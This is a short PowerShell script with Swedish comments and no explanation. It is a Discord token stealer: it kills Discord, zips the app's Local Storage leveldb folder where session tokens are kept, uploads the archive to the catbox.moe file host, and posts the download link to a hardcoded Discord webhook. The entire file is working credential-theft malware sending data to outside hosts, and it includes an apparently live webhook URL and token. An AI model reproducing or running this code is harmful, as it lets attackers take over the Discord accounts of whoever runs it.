try {
Stop-Process (try {get-process -Name "Discord"}) 
}
catch {}
Compress-Archive -Path "$env:appdata\discord\Local Storage\leveldb" -DestinationPath "$env:temp\send.zip" -Force







# Sökvägen till filen i din lokala temp-mapp
$ZipPath = "$env:temp\send.zip"

if (-not (Test-Path $ZipPath)) {
    Write-Host "Fel: Hittade inte filen send.zip i temp-mappen!" -ForegroundColor Red
    return
}

Write-Host "Hittade filen i temp! Laddar upp till Catbox..." -ForegroundColor Cyan

# Lägg till krypteringsstöd för nätverket
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Bygg ett rent standardformulär som Catbox förstår direkt
$Body = @{
    "reqtype"      = "fileupload"
    "fileToUpload" = Get-Item $ZipPath
}

try {
    # Skicka filen via inbyggda Invoke-WebRequest (stabilare för formulär än Invoke-RestMethod)
    $Upload = Invoke-WebRequest -Uri "https://catbox.moe/user/api.php" -Method POST -Form $Body -TimeoutSec 300
    
    Write-Host "`nUppladdning klar!" -ForegroundColor Green
    Write-Host "Länk: $($Upload.Content)" -ForegroundColor Yellow
} catch {
    Write-Host "`nDet gick inte att ladda upp: $_" -ForegroundColor Red
}



# Replace with your actual Discord webhook URL
$WebhookUrl = "https://discord.com/api/webhooks/1537527683917938739/SdPz6jcEZA0ainudogL8UwvoibVxzisPr5YMmL4eo72MhJ0O9nISX5qV6taYwj5fhUb6"

# Create the payload (Discord requires 'content')
$Body = [PSCustomObject]@{
    content    = $Upload.Content
    username   = "PowerShell Monitor"
    avatar_url = "https://imgur.com" # Optional custom bot avatar
} | ConvertTo-Json

# Send the request
Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Body -ContentType "application/json"
